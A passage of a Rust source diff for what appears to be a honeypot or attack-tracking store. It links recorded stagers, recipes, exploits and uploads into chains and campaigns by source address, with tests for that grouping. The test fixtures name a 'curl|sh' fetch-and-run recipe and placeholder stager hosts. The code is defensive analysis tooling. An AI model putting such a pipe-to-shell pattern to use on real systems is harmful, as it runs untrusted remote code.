+) -> Result<Option<Chain>> {
+    let Some((found, tags, span)) = read_sources(conn, sources).await? else {
+        return Ok(None);
+    };
+    let ids = sources.iter().filter(|s| s.0 == UPLOAD).map(|s| s.1);
+    let ids = ids.map(|i| i.to_string()).collect::<Vec<_>>().join(",");
+    let uploads: Vec<UploadRow> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT {UPLOAD_COLS} WHERE u.id IN ({ids}) ORDER BY u.id DESC LIMIT ?"
+    )))
+    .bind(UPLOADS_MAX)
+    .fetch_all(&mut *conn)
+    .await?;
+    let follow = gather_follow_ups(conn, &uploads).await?;
+    let results = results_of(conn, &found).await?;
+    let stages = stages(
+        &Parts {
+            key: None,
+            found: &found,
+            tags: &tags,
+            uploads: &uploads,
+            follow: &follow,
+            results: &results,
+        },
+        here,
+    );
+    Ok(Some(Chain {
+        key: None,
+        stages,
+        ips: span.ips,
+        sources: span.sources,
+        first_seen: span.first_seen,
+        last_seen: span.last_seen,
+        more: span.more,
+    }))
+}
+
+/// Every key's chain, newest first.
+async fn all_keyed(
+    conn: &mut SqliteConnection,
+    keys: Vec<String>,
+    here: &Here,
+) -> Result<Vec<Chain>> {
+    let mut out = vec![];
+    for key in keys {
+        out.extend(keyed(conn, &key, here).await?);
+    }
+    Ok(out)
+}
+
+/// A source's chains, or, with no joiner in one, its own.
+async fn of_sources(
+    conn: &mut SqliteConnection,
+    sources: &[(u8, i64)],
+    mut here: Here,
+    max: usize,
+) -> Result<Vec<Chain>> {
+    here.dim = true;
+    let pieces: Vec<i64> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
+        "SELECT DISTINCT g.piece FROM piece_sightings g WHERE g.role IN {STRIP_ROLES} AND {}",
+        sources_in(sources)
+    )))
+    .fetch_all(&mut *conn)
+    .await?;
+    here.pieces.extend(pieces);
+    let keys = keys_where(conn, &sources_in(sources), None, max).await?;
+    let chains = all_keyed(conn, keys, &here).await?;
+    if !chains.is_empty() {
+        return Ok(chains);
+    }
+    Ok(unkeyed(conn, sources, &here).await?.into_iter().collect())
+}
+
+/// A piece's chain, or a chain of the newest sources sharing it. Only the
+/// sightings a strip would show count, so a queried URL has none.
+async fn of_piece(conn: &mut SqliteConnection, hash: i64) -> Result<Vec<Chain>> {
+    let here = Here {
+        pieces: HashSet::from([hash]),
+        ..Here::default()
+    };
+    let key: Option<String> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
+        "SELECT m.chain FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+         WHERE m.piece = ? AND p.kind IN {JOINER_KINDS} LIMIT 1"
+    )))
+    .bind(hash)
+    .fetch_optional(&mut *conn)
+    .await?;
+    if let Some(key) = key
+        && let Some(chain) = keyed(conn, &key, &here).await?
+    {
+        return Ok(vec![chain]);
+    }
+    let held: Vec<(String, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT DISTINCT source_kind, source_id FROM
+           (SELECT source_kind, source_id FROM piece_sightings
+            INDEXED BY idx_sightings_piece_ts
+            WHERE piece = ? AND role IN {STRIP_ROLES} ORDER BY ts DESC LIMIT ?)"
+    )))
+    .bind(hash)
+    .bind(SHARED_SOURCES_MAX)
+    .fetch_all(&mut *conn)
+    .await?;
+    if held.is_empty() {
+        return Ok(vec![]);
+    }
+    let sources: Vec<(u8, i64)> = held.iter().map(|(k, i)| source_of(k, *i)).collect();
+    let Some(mut chain) = unkeyed(conn, &sources, &here).await? else {
+        return Ok(vec![]);
+    };
+    // Over the cap, `unkeyed` covers the newest sources; the figures do not
+    // stop there. The piece's own, as counting its sightings is what the cap
+    // spares: they can lag the last extraction, and include a queried URL.
+    if held.len() as i64 >= SHARED_SOURCES_MAX {
+        let row: Option<(i64, i64, String, String)> =
+            sqlx::query_as("SELECT ips, sources, first_seen, last_seen FROM pieces WHERE hash = ?")
+                .bind(hash)
+                .fetch_optional(&mut *conn)
+                .await?;
+        if let Some((ips, n, first, last)) = row {
+            chain.ips = chain.ips.max(ips);
+            chain.sources = chain.sources.max(n);
+            chain.first_seen = chain.first_seen.min(first);
+            chain.last_seen = chain.last_seen.max(last);
+        }
+    }
+    Ok(vec![chain])
+}
+
+/// A chain in the Chains list.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ChainRow {
+    pub key: String,
+    /// The joiner that names it, defanged, and its page.
+    pub joiner: Option<(String, String)>,
+    pub first_seen: String,
+    pub last_seen: String,
+    pub ips: i64,
+    pub sources: i64,
+    pub exploits: i64,
+    pub payload: Mark,
+}
+
+/// A [`ChainRow`] as stored.
+#[derive(sqlx::FromRow)]
+struct ListedChain {
+    key: String,
+    first_seen: String,
+    last_seen: String,
+    ips: i64,
+    sources: i64,
+    exploits: i64,
+    text_held: bool,
+    result_held: bool,
+}
+
+/// Which chains the list shows.
+#[derive(Debug, Clone, Copy, Default)]
+pub struct ChainFilter<'a> {
+    /// Those of this address's id.
+    pub ip: Option<i64>,
+    /// Those of this campaign's members.
+    pub campaign: Option<&'a str>,
+}
+
+impl Store {
+    /// The chains an anchor belongs to, newest first, at most
+    /// [`CHAINS_MAX`]. A source with no joiner in a chain gets one chain,
+    /// without a key, of what it holds; nothing to show gives none.
+    pub async fn chains_of(&self, a: Anchor<'_>) -> Result<Vec<Chain>> {
+        self.chains_upto(a, CHAINS_MAX).await
+    }
+
+    /// How many chains a request and what it carried belong to, past the
+    /// cap of [`Store::chains_of`].
+    pub async fn chains_of_request(&self, id: i64) -> Result<i64> {
+        Ok(sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
+            "SELECT COUNT(DISTINCT m.chain) FROM piece_sightings g
+             JOIN chain_pieces m ON m.piece = g.piece
+             WHERE g.role IN {JOINER_ROLES} AND (
+               (g.source_kind = 'request' AND g.source_id = ?1)
+               OR (g.source_kind = 'upload' AND g.source_id IN
+                 (SELECT u.id FROM uploads u JOIN requests r ON r.uid = u.request_uid
+                  WHERE r.id = ?1)))"
+        )))
+        .bind(id)
+        .fetch_one(&self.read)
+        .await?)
+    }
+
+    /// The chain of this key, whatever the cap of [`Store::chains_of`]; None
+    /// when no chain has it.
+    pub async fn chain_by_key(&self, key: &str) -> Result<Option<Chain>> {
+        let mut conn = self.read.acquire().await?;
+        keyed(&mut conn, key, &Here::default()).await
+    }
+
+    /// [`Store::chains_of`], building at most `max`.
+    pub async fn chains_upto(&self, a: Anchor<'_>, max: usize) -> Result<Vec<Chain>> {
+        let mut conn = self.read.acquire().await?;
+        let conn = &mut *conn;
+        match a {
+            Anchor::Request(id) => {
+                let carried: Vec<(i64, String)> = sqlx::query_as(
+                    "SELECT u.id, u.uid FROM uploads u JOIN requests r ON r.uid = u.request_uid
+                     WHERE r.id = ?",
+                )
+                .bind(id)
+                .fetch_all(&mut *conn)
+                .await?;
+                let mut sources = vec![(REQUEST, id)];
+                sources.extend(carried.iter().map(|(u, _)| (UPLOAD, *u)));
+                let here = Here {
+                    requests: HashSet::from([id]),
+                    uploads: carried.into_iter().map(|(_, uid)| uid).collect(),
+                    ..Here::default()
+                };
+                of_sources(conn, &sources, here, max).await
+            }
+            Anchor::Upload(uid) => {
+                let row: Option<(i64, Option<i64>)> = sqlx::query_as(
+                    "SELECT u.id, r.id FROM uploads u
+                     LEFT JOIN requests r ON r.uid = u.request_uid WHERE u.uid = ?",
+                )
+                .bind(uid)
+                .fetch_optional(&mut *conn)
+                .await?;
+                let Some((id, carrier)) = row else {
+                    return Ok(vec![]);
+                };
+                let mut sources = vec![(UPLOAD, id)];
+                sources.extend(carrier.map(|r| (REQUEST, r)));
+                let here = Here {
+                    requests: carrier.into_iter().collect(),
+                    uploads: HashSet::from([uid.to_string()]),
+                    ..Here::default()
+                };
+                of_sources(conn, &sources, here, max).await
+            }
+            Anchor::Ip(ip) => {
+                let keys = keys_where(conn, &format!("g.ip_id = {ip}"), None, max).await?;
+                let marks = vec!["?"; keys.len()].join(",");
+                // Of these chains: an address can have sent millions of pieces.
+                let sql = format!(
+                    "SELECT DISTINCT piece FROM piece_sightings
+                     WHERE ip_id = ? AND role IN {STRIP_ROLES} AND piece IN
+                       (SELECT piece FROM chain_pieces WHERE chain IN ({marks}))"
+                );
+                let mut q = sqlx::query_scalar(sqlx::AssertSqlSafe(sql)).bind(ip);
+                for key in &keys {
+                    q = q.bind(key);
+                }
+                let pieces: Vec<i64> = q.fetch_all(&mut *conn).await?;
+                let here = Here {
+                    pieces: pieces.into_iter().collect(),
+                    ..Here::default()
+                };
+                all_keyed(conn, keys, &here).await
+            }
+            Anchor::Campaign(key) => {
+                let members = "g.ip_id IN
+                    (SELECT ip_id FROM campaign_members WHERE campaign_key = ?)";
+                let keys = keys_where(conn, members, Some(key), max).await?;
+                all_keyed(conn, keys, &Here::default()).await
+            }
+            Anchor::Piece(hash) => of_piece(conn, hash).await,
+        }
+    }
+
+    /// The 404s after the newest uploads ([`DEAD_END_UPLOADS`]) from any
+    /// address, grouped by path, newest first, at most `limit`. The condition
+    /// is [`dead_ends`]'s.
+    pub async fn dead_ends_all(&self, limit: i64) -> Result<Vec<DeadEnd>> {
+        let mut conn = self.read.acquire().await?;
+        let uploads: Vec<UploadRow> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+            "SELECT {UPLOAD_COLS} ORDER BY u.id DESC LIMIT ?"
+        )))
+        .bind(DEAD_END_UPLOADS)
+        .fetch_all(&mut *conn)
+        .await?;
+        let mut seen = BTreeMap::new();
+        for batch in uploads.chunks(TIMELINE_UPLOADS) {
+            for r in dead_ends_for(&mut conn, batch).await? {
+                seen.insert(r.id, r);
+            }
+        }
+        let mut by_path: HashMap<String, (i64, BTreeSet<String>, String)> = HashMap::new();
+        for r in seen.into_values() {
+            let e = by_path.entry(r.path).or_default();
+            e.0 += 1;
+            e.1.insert(r.ip);
+            if r.ts > e.2 {
+                e.2 = r.ts;
+            }
+        }
+        let mut out: Vec<DeadEnd> = by_path
+            .into_iter()
+            .map(|(path, (hits, ips, last_seen))| DeadEnd {
+                shown: defang(&path),
+                path,
+                hits,
+                ips: ips.len() as i64,
+                last_seen,
+            })
+            .collect();
+        out.sort_by(|a, b| b.last_seen.cmp(&a.last_seen).then(a.path.cmp(&b.path)));
+        out.truncate(usize::try_from(limit).unwrap_or(0));
+        Ok(out)
+    }
+
+    /// One page of chains, newest first.
+    pub async fn chains_page(&self, page: u32, f: ChainFilter<'_>) -> Result<Page<ChainRow>> {
+        let of_addresses = |who: &str| {
+            format!(
+                "WHERE c.key IN (SELECT m.chain FROM piece_sightings g
+                   JOIN chain_pieces m ON m.piece = g.piece
+                   JOIN pieces p ON p.hash = m.piece
+                   WHERE g.role IN {JOINER_ROLES} AND g.ip_id IN ({who}))"
+            )
+        };
+        let only = match (f.ip, f.campaign) {
+            (Some(_), _) => of_addresses("?"),
+            (None, Some(_)) => {
+                of_addresses("SELECT ip_id FROM campaign_members WHERE campaign_key = ?")
+            }
+            (None, None) => String::new(),
+        };
+        let sql = format!(
+            "SELECT c.key, c.first_seen, c.last_seen, c.ips, c.sources,
+               (SELECT COUNT(*) FROM chain_pieces x JOIN pieces p ON p.hash = x.piece
+                WHERE x.chain = c.key AND p.kind = 'exploit') AS exploits,
+               EXISTS(SELECT 1 FROM chain_pieces x JOIN pieces p ON p.hash = x.piece
+                 JOIN piece_sightings g ON g.piece = x.piece AND g.source_kind = 'upload'
+                 JOIN uploads u ON u.id = g.source_id
+                 WHERE x.chain = c.key AND p.kind IN {JOINER_KINDS}
+                   AND g.role IN {JOINER_ROLES} AND {HELD_TEXT}) AS text_held,
+               EXISTS(SELECT 1 FROM chain_pieces x JOIN piece_results r ON r.piece = x.piece
+                 WHERE x.chain = c.key) AS result_held
+             FROM chains c {only} ORDER BY c.last_seen DESC, c.key LIMIT ? OFFSET ?"
+        );
+        let mut q = sqlx::query_as::<_, ListedChain>(sqlx::AssertSqlSafe(sql));
+        if let Some(ip) = f.ip {
+            q = q.bind(ip);
+        } else if let Some(c) = f.campaign {
+            q = q.bind(c);
+        }
+        let rows = q
+            .bind(PAGE_SIZE + 1)
+            .bind(offset(page))
+            .fetch_all(&self.read)
+            .await?;
+        let hashes: Vec<String> = rows
+            .iter()
+            .filter_map(|r| key_piece(&r.key))
+            .map(|h| h.to_string())
+            .collect();
+        let pieces: Vec<(i64, String, String)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+            "SELECT hash, kind, value FROM pieces WHERE hash IN ({})",
+            hashes.join(",")
+        )))
+        .fetch_all(&self.read)
+        .await?;
+        let named: HashMap<i64, (String, String)> = pieces
+            .into_iter()
+            .map(|(hash, kind, value)| {
+                let href = link_href(&kind, &value);
+                (hash, (label(&value), href))
+            })
+            .collect();
+        let rows = rows
+            .into_iter()
+            .map(|r| ChainRow {
+                joiner: key_piece(&r.key).and_then(|h| named.get(&h).cloned()),
+                key: r.key,
+                first_seen: r.first_seen,
+                last_seen: r.last_seen,
+                ips: r.ips,
+                sources: r.sources,
+                exploits: r.exploits,
+                payload: match (r.text_held, r.result_held) {
+                    (true, _) => Mark::Seen,
+                    (false, true) => Mark::External,
+                    (false, false) => Mark::Gap,
+                },
+            })
+            .collect();
+        Ok(Page::from_rows(rows, page))
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::store::Store;
+    use crate::store::campaigns::HARD_FANOUT_MAX;
+    use crate::store::pieces::{extract, piece_hash};
+    use crate::store::requests::NewRequest;
+    use crate::store::uploads::seed_upload;
+
+    const T0: &str = "2026-10-01 00:00:00";
+    const T1: &str = "2026-10-02 00:00:00";
+    /// More than the 32 bytes a `file` piece needs.
+    const FILE: &[u8] = b"<?php echo 'a file of at least thirty-two bytes'; ?>";
+
+    /// A joiner in a source, as a test states it. `source` is the kind
+    /// ([`REQUEST`] or [`UPLOAD`]) and the row's id.
+    struct JoinerSighting {
+        piece: i64,
+        source: (u8, i64),
+        ip: i64,
+        ts: String,
+    }
+
+    /// [`super::connect`] of these sightings, as the pass's reads give them.
+    fn connect(rows: &[JoinerSighting]) -> Vec<ChainOut> {
+        let mut spans: BTreeMap<(i64, i64), JoinerSpan> = BTreeMap::new();
+        let mut sources: BTreeMap<(u8, i64), (i64, BTreeSet<i64>)> = BTreeMap::new();
+        for r in rows {
+            let span = spans.entry((r.piece, r.ip)).or_insert(JoinerSpan {
+                piece: r.piece,
+                ip: r.ip,
+                first: r.ts.clone(),
+                last: r.ts.clone(),
+            });
+            span.first = span.first.as_str().min(&r.ts).to_string();
+            span.last = span.last.as_str().max(&r.ts).to_string();
+            sources
+                .entry(r.source)
+                .or_insert((r.ip, BTreeSet::new()))
+                .1
+                .insert(r.piece);
+        }
+        let mut lists: BTreeMap<(i64, Vec<i64>), i64> = BTreeMap::new();
+        let mut pairs: BTreeSet<(i64, i64, i64)> = BTreeSet::new();
+        for (ip, joiners) in sources.into_values() {
+            let joiners: Vec<i64> = joiners.into_iter().collect();
+            if joiners.len() <= PAIRED_JOINERS_MAX {
+                for (i, &a) in joiners.iter().enumerate() {
+                    pairs.extend(joiners[i + 1..].iter().map(|&b| (ip, a, b)));
+                }
+            }
+            *lists.entry((ip, joiners)).or_default() += 1;
+        }
+        let lists: Vec<JoinerList> = lists
+            .into_iter()
+            .map(|((ip, joiners), sources)| JoinerList {
+                ip,
+                joiners,
+                sources,
+            })
+            .collect();
+        let pairs: Vec<JoinerPair> = pairs
+            .into_iter()
+            .map(|(ip, a, b)| JoinerPair { ip, a, b })
+            .collect();
+        let spans: Vec<JoinerSpan> = spans.into_values().collect();
+        super::connect(&spans, &pairs, &lists)
+    }
+
+    fn at(piece: i64, source: (u8, i64), ip: i64, ts: &str) -> JoinerSighting {
+        JoinerSighting {
+            piece,
+            source,
+            ip,
+            ts: ts.into(),
+        }
+    }
+
+    fn joiners(chains: &[ChainOut]) -> Vec<Vec<i64>> {
+        chains.iter().map(|c| c.joiners.clone()).collect()
+    }
+
+    fn the(chains: &[ChainOut], piece: i64) -> &ChainOut {
+        chains.iter().find(|c| c.joiners.contains(&piece)).unwrap()
+    }
+
+    #[test]
+    fn one_forged_body_fuses_nothing() {
+        let forged = connect(&[at(1, (REQUEST, 1), 10, T0), at(2, (REQUEST, 1), 10, T0)]);
+        assert_eq!(joiners(&forged), [[1], [2]]);
+        // Sent again from the same address, it still is one address.
+        let again = connect(&[
+            at(1, (REQUEST, 1), 10, T0),
+            at(2, (REQUEST, 1), 10, T0),
+            at(1, (REQUEST, 2), 10, T1),
+            at(2, (REQUEST, 2), 10, T1),
+            at(1, (UPLOAD, 2), 10, T1),
+            at(2, (UPLOAD, 2), 10, T1),
+        ]);
+        assert_eq!(joiners(&again), [[1], [2]]);
+    }
+
+    #[test]
+    fn two_addresses_connect_joiners() {
+        let c = connect(&[
+            at(1, (REQUEST, 1), 10, T0),
+            at(2, (REQUEST, 1), 10, T0),
+            at(1, (UPLOAD, 1), 11, T1),
+            at(2, (UPLOAD, 1), 11, T1),
+        ]);
+        assert_eq!(joiners(&c), [[1, 2]]);
+        assert_eq!((c[0].ips, c[0].sources), (2, 2));
+        assert_eq!(
+            (c[0].first_seen.as_str(), c[0].last_seen.as_str()),
+            (T0, T1)
+        );
+    }
+
+    #[test]
+    fn connection_runs_through_a_shared_joiner() {
+        let c = connect(&[
+            at(1, (REQUEST, 1), 10, T0),
+            at(2, (REQUEST, 1), 10, T0),
+            at(1, (REQUEST, 2), 11, T0),
+            at(2, (REQUEST, 2), 11, T0),
+            at(2, (REQUEST, 3), 12, T0),
+            at(3, (REQUEST, 3), 12, T0),
+            at(2, (REQUEST, 4), 13, T0),
+            at(3, (REQUEST, 4), 13, T0),
+        ]);
+        assert_eq!(joiners(&c), [[1, 2, 3]]);
+    }
+
+    /// `shared` addresses name joiners 1 and 2 together, and `each` more
+    /// name each alone.
+    fn overlapping(shared: i64, each: i64) -> Vec<JoinerSighting> {
+        let mut rows = vec![];
+        for ip in 0..shared {
+            rows.extend([at(1, (REQUEST, ip), ip, T0), at(2, (REQUEST, ip), ip, T0)]);
+        }
+        for ip in shared..shared + each {
+            rows.push(at(1, (REQUEST, ip), ip, T0));
+            rows.push(at(2, (UPLOAD, ip), ip + each, T0));
+        }
+        rows
+    }
+
+    #[test]
+    fn two_addresses_on_two_large_joiners_fuse_nothing() {
+        assert_eq!(joiners(&connect(&overlapping(2, 28))), [[1], [2]]);
+    }
+
+    #[test]
+    fn a_tenth_of_the_larger_joiner_connects() {
+        assert_eq!(joiners(&connect(&overlapping(3, 27))), [[1, 2]]);
+        // 37 addresses on both of 100 each, 163 in all.
+        assert_eq!(joiners(&connect(&overlapping(37, 63))), [[1, 2]]);
+        assert_eq!(joiners(&connect(&overlapping(9, 91))), [[1], [2]]);
+    }
+
+    #[test]
+    fn one_address_using_two_stagers_connects_nothing() {
+        // Both on both addresses, but never in one source.
+        let c = connect(&[
+            at(1, (REQUEST, 1), 10, T0),
+            at(2, (REQUEST, 2), 10, T0),
+            at(1, (REQUEST, 3), 11, T0),
+            at(2, (REQUEST, 4), 11, T0),
+        ]);
+        assert_eq!(joiners(&c), [[1], [2]]);
+    }
+
+    /// `n` joiners named together, by each of two addresses.
+    fn named_together(n: i64) -> Vec<JoinerSighting> {
+        (0..n)
+            .flat_map(|j| [at(j, (REQUEST, 1), 10, T0), at(j, (REQUEST, 2), 11, T0)])
+            .collect()
+    }
+
+    #[test]
+    fn a_source_naming_too_many_joiners_connects_none() {
+        let at_cap = named_together(PAIRED_JOINERS_MAX as i64);
+        assert_eq!(connect(&at_cap).len(), 1, "at the cap");
+        let over = connect(&named_together(PAIRED_JOINERS_MAX as i64 + 1));
+        assert_eq!(over.len(), PAIRED_JOINERS_MAX + 1);
+        // Left out of the pairs only: each still has its sources.
+        assert!(over.iter().all(|c| c.sources == 2 && c.ips == 2));
+    }
+
+    #[test]
+    fn chain_key_is_its_oldest_joiner() {
+        let pair = |a, b, s: i64, ts: &str| {
+            [
+                at(a, (REQUEST, s), s + 100, ts),
+                at(b, (REQUEST, s), s + 100, ts),
+            ]
+        };
+        let mut rows: Vec<JoinerSighting> = [pair(0x20, 0x10, 1, T1), pair(0x20, 0x10, 2, T1)]
+            .into_iter()
+            .flatten()
+            .collect();
+        rows.push(at(0x20, (REQUEST, 3), 200, T0));
+        let c = connect(&rows);
+        assert_eq!(c.len(), 1);
+        assert_eq!(c[0].key, "0000000000000020", "older than the lower hash");
+        // A newer joiner grows the chain and leaves the key.
+        rows.extend(pair(0x10, 0x05, 4, T1));
+        rows.extend(pair(0x10, 0x05, 5, T1));
+        let grown = connect(&rows);
+        assert_eq!(grown.len(), 1);
+        assert_eq!(grown[0].joiners, [0x05, 0x10, 0x20]);
+        assert_eq!(grown[0].key, "0000000000000020");
+        // Ties break by hash. A negative hash is its 64 bits.
+        assert_eq!(
+            connect(&[at(7, (REQUEST, 1), 1, T0)])[0].key,
+            "0000000000000007"
+        );
+        let tie = connect(&[
+            at(9, (REQUEST, 1), 1, T0),
+            at(-1, (REQUEST, 1), 1, T0),
+            at(9, (REQUEST, 2), 2, T0),
+            at(-1, (REQUEST, 2), 2, T0),
+        ]);
+        assert_eq!(tie[0].key, "ffffffffffffffff");
+    }
+
+    #[test]
+    fn source_with_two_unconnected_joiners_counts_in_both() {
+        let c = connect(&[
+            at(1, (REQUEST, 1), 10, T0),
+            at(2, (REQUEST, 1), 10, T0),
+            at(1, (REQUEST, 2), 10, T1),
+        ]);
+        assert_eq!(joiners(&c), [[1], [2]]);
+        assert_eq!(the(&c, 1).sources, 2);
+        assert_eq!(the(&c, 2).sources, 1);
+    }
+
+    async fn store() -> (Store, tempfile::TempDir) {
+        let dir = tempfile::tempdir().unwrap();
+        let s = Store::connect(&dir.path().join("t.db")).await.unwrap();
+        (s, dir)
+    }
+
+    /// A sighting as extraction stores it.
+    async fn sight(
+        s: &Store,
+        (kind, value, role): (&str, &str, &str),
+        (source_kind, source_id): (&str, i64),
+        ip: i64,
+    ) -> i64 {
+        let hash = piece_hash(kind, value);
+        sqlx::query(
+            "INSERT OR IGNORE INTO pieces (hash, kind, value, first_seen, last_seen, ips, sources)
+             VALUES (?, ?, ?, ?, ?, 0, 0)",
+        )
+        .bind(hash)
+        .bind(kind)
+        .bind(value)
+        .bind(T0)
+        .bind(T0)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        sqlx::query("INSERT INTO piece_sightings VALUES (?, ?, ?, ?, ?, 'claimed', ?)")
+            .bind(hash)
+            .bind(source_kind)
+            .bind(source_id)
+            .bind(ip)
+            .bind(role)
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        hash
+    }
+
+    async fn run(s: &Store) {
+        let mut c = s.pool.acquire().await.unwrap();
+        let p = plan(&mut c).await.unwrap();
+        drop(c);
+        let mut tx = s.pool.begin_with("BEGIN IMMEDIATE").await.unwrap();
+        store_plan(&mut tx, &p).await.unwrap();
+        tx.commit().await.unwrap();
+    }
+
+    fn key_of(piece: i64) -> String {
+        format!("{:016x}", piece as u64)
+    }
+
+    /// The pieces of the chain `key`, in order.
+    async fn pieces_of(s: &Store, key: &str) -> Vec<i64> {
+        sqlx::query_scalar("SELECT piece FROM chain_pieces WHERE chain = ? ORDER BY piece")
+            .bind(key)
+            .fetch_all(&s.pool)
+            .await
+            .unwrap()
+    }
+
+    async fn chains(s: &Store) -> Vec<(String, String, String, i64, i64, i64)> {
+        sqlx::query_as("SELECT key, first_seen, last_seen, ips, sources, v FROM chains")
+            .fetch_all(&s.pool)
+            .await
+            .unwrap()
+    }
+
+    fn sorted(mut v: Vec<i64>) -> Vec<i64> {
+        v.sort_unstable();
+        v
+    }
+
+    const STAGER_A: (&str, &str, &str) = ("stager", "a.example.org", "stager");
+    const STAGER_B: (&str, &str, &str) = ("stager", "b.example.org", "stager");
+    const RECIPE: (&str, &str, &str) = ("recipe", "curl|sh", "recipe");
+
+    #[tokio::test]
+    async fn sharing_a_recipe_connects_nothing() {
+        let (s, _d) = store().await;
+        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
+        let b = sight(&s, STAGER_B, ("request", 2), 11).await;
+        let r = sight(&s, RECIPE, ("request", 1), 10).await;
+        sight(&s, RECIPE, ("request", 2), 11).await;
+        run(&s).await;
+        assert_eq!(chains(&s).await.len(), 2);
+        assert_eq!(pieces_of(&s, &key_of(a)).await, sorted(vec![a, r]));
+        assert_eq!(pieces_of(&s, &key_of(b)).await, sorted(vec![b, r]));
+    }
+
+    #[tokio::test]
+    async fn a_pass_replaces_the_last_one_and_stamps_the_version() {
+        let (s, _d) = store().await;
+        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
+        run(&s).await;
+        assert_eq!(
+            chains(&s).await,
+            [(key_of(a), T0.into(), T0.into(), 1, 1, CHAIN_V)]
+        );
+        sqlx::query("DELETE FROM piece_sightings")
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        let b = sight(&s, STAGER_B, ("request", 2), 11).await;
+        run(&s).await;
+        assert_eq!(chains(&s).await.len(), 1);
+        assert_eq!(chains(&s).await[0].0, key_of(b));
+        assert_eq!(pieces_of(&s, &key_of(a)).await, Vec::<i64>::new());
+    }
+
+    /// `n` joiners of `ip`, the kind `stager`, numbered from `from`, in
+    /// `n / per` sources from `first_source`, each a second newer than the
+    /// last. What a flood leaves behind, without parsing it.
+    async fn flood(s: &Store, ip: i64, from: i64, n: i64, per: i64, first_source: i64) {
+        sqlx::query(
+            "WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i + 1 FROM c WHERE i + 1 < ?1)
+             INSERT OR IGNORE INTO pieces (hash, kind, value, first_seen, last_seen, ips, sources)
+             SELECT ?2 + i, 'stager', 'h' || (?2 + i) || '.example.org', ?3, ?3, 0, 0 FROM c",
+        )
+        .bind(n)
+        .bind(from)
+        .bind(T0)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        sqlx::query(
+            "WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i + 1 FROM c WHERE i + 1 < ?1)
+             INSERT INTO piece_sightings
+             SELECT ?2 + i, 'request', ?3 + i / ?4, ?5, 'stager', 'claimed',
+                    datetime(?6, '+' || (i / ?4) || ' seconds') FROM c",
+        )
+        .bind(n)
+        .bind(from)
+        .bind(first_source)
+        .bind(per)
+        .bind(ip)
+        .bind(T0)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+    }
+
+    async fn rows_of(s: &Store, table: &str) -> i64 {
+        sqlx::query_scalar(sqlx::AssertSqlSafe(format!("SELECT COUNT(*) FROM {table}")))
+            .fetch_one(&s.pool)
+            .await
+            .unwrap()
+    }
+
+    #[tokio::test]
+    async fn one_address_naming_thousands_of_joiners_keeps_its_cap() {
+        let (s, _d) = store().await;
+        let ip = s.upsert_ip("203.0.113.10".parse().unwrap()).await.unwrap();
+        // Each body names 256 fresh stagers, as a 5 KiB PHP body can.
+        flood(&s, ip.id, 1_000, 25_600, 256, 1).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        let spans = joiner_spans(&mut c).await.unwrap();
+        assert_eq!(spans.len(), MAX_JOINERS_PER_IP);
+        let lists = joiner_lists(&mut c).await.unwrap();
+        assert_eq!(lists.len(), 1, "the newest body holds all it kept");
+        let pairs = joiner_pairs(&mut c).await.unwrap();
+        assert!(pairs.is_empty(), "a source over the limit pairs nothing");
+        let input = crate::store::campaigns::Input::read(&mut c).await.unwrap();
+        assert!(input.joiners.len() <= 256, "{}", input.joiners.len());
+        let p = plan(&mut c).await.unwrap();
+        drop(c);
+        assert_eq!(p.chains.len(), MAX_JOINERS_PER_IP);
+        assert_eq!(p.members.len(), MAX_JOINERS_PER_IP);
+        run(&s).await;
+        assert_eq!(rows_of(&s, "chains").await, MAX_JOINERS_PER_IP as i64);
+        assert_eq!(rows_of(&s, "chain_pieces").await, MAX_JOINERS_PER_IP as i64);
+        // No other address names them, so none could form an edge: the
+        // campaigns list no cap.
+        let r = s.recompute_campaigns(true).await.unwrap();
+        assert!(!r.excluded.iter().any(|e| e.kind == "joiner cap"), "{r}");
+    }
+
+    #[tokio::test]
+    async fn two_addresses_naming_fresh_stagers_together_keep_their_cap() {
+        let (s, _d) = store().await;
+        // The same 64-stager bodies from both, each body with fresh hosts.
+        flood(&s, 10, 1_000, 6_400, 64, 1).await;
+        flood(&s, 11, 1_000, 6_400, 64, 1_000).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(
+            joiner_spans(&mut c).await.unwrap().len(),
+            2 * MAX_JOINERS_PER_IP
+        );
+        let p = plan(&mut c).await.unwrap();
+        drop(c);
+        assert_eq!(p.chains.len(), 1, "the newest body's joiners connect");
+        assert_eq!(p.members.len(), MAX_JOINERS_PER_IP);
+    }
+
+    #[tokio::test]
+    async fn an_address_sending_every_subset_keeps_its_cap() {
+        let (s, _d) = store().await;
+        // Address 10 names 10 stagers in one body; address 11 names them in
+        // 600 bodies, each a different subset.
+        flood(&s, 10, 1_000, 10, 10, 1).await;
+        sqlx::query(
+            "WITH RECURSIVE c(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM c WHERE i < 600),
+             b(j) AS (SELECT 0 UNION ALL SELECT j + 1 FROM b WHERE j < 15)
+             INSERT INTO piece_sightings
+             SELECT 1000 + j, 'request', 10000 + i, 11, 'stager', 'claimed', ?
+             FROM c, b WHERE (i >> j) & 1",
+        )
+        .bind(T1)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        let mut c = s.pool.acquire().await.unwrap();
+        let lists = joiner_lists(&mut c).await.unwrap();
+        let of_11: Vec<&JoinerList> = lists.iter().filter(|l| l.ip == 11).collect();
+        assert_eq!(of_11.len(), LISTS_PER_IP as usize + 1);
+        assert_eq!(of_11.iter().map(|l| l.sources).sum::<i64>(), 600);
+        let rest = of_11
+            .iter()
